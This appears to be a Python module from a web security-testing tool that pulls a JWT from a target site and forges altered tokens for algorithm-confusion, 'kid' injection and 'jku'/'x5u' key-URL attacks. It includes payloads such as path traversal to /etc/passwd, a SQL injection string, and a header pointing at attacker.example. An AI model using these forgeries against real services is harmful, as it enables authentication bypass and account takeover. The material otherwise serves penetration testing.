"""jwt_confusion — JWT algorithm confusion (RS256→HS256, kid, jku, x5u)"""
import base64, json, re
from core.http import HttpClient


def b64e(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def b64d(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


class JwtConfusion:
    def run(self, session, logger):
        http = HttpClient(session, logger)
        r = http.get(session.target)
        if not r:
            return {}

        JWT_RE = re.compile(r"eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*")
        token = None
        for m in JWT_RE.findall(r.text)[:5]:
            token = m
            break
        if not token:
            for c in r.cookies:
                if JWT_RE.match(c.value):
                    token = c.value
                    break
        if not token:
            print("[jwt_confusion] no token found")
            return {}

        print(f"[jwt_confusion] token: {token[:60]}...")
        try:
            h, p, sig = token.split(".")
            header = json.loads(b64d(h))
            payload = json.loads(b64d(p))
        except Exception as e:
            print(f"[jwt_confusion] decode error: {e}")
            return {}

        print(f"  alg: {header.get('alg')}")
        print(f"  kid: {header.get('kid', 'none')}")
        findings = []

        if header.get("alg", "").startswith("RS"):
            new_header = dict(header)
            new_header["alg"] = "HS256"
            forged = b64e(json.dumps(new_header).encode()) + "." + b64e(json.dumps(payload).encode()) + "."
            findings.append({"type": "rs_hs_confusion", "candidate": forged[:80],
                             "severity": "high"})
            logger.finding("jwt_confusion", "high", "RS256→HS256 candidate")

        for kid_val in ["../../dev/null", "../../../etc/passwd", "' OR '1'='1", "any"]:
            new_header = dict(header)
            new_header["kid"] = kid_val
            forged = b64e(json.dumps(new_header).encode()) + "." + b64e(json.dumps(payload).encode()) + "."
            findings.append({"type": "kid_injection", "kid": kid_val,
                             "severity": "medium"})

        for field in ["jku", "x5u"]:
            new_header = dict(header)
            new_header[field] = "https://attacker.example/jwks.json"
            forged = b64e(json.dumps(new_header).encode()) + "." + b64e(json.dumps(payload).encode()) + "."
            findings.append({"type": f"{field}_injection", "severity": "high"})
            logger.finding("jwt_confusion", "high", f"{field} injection")

        print(f"[jwt_confusion] total: {len(findings)}")
        return {"findings": findings, "header": header}
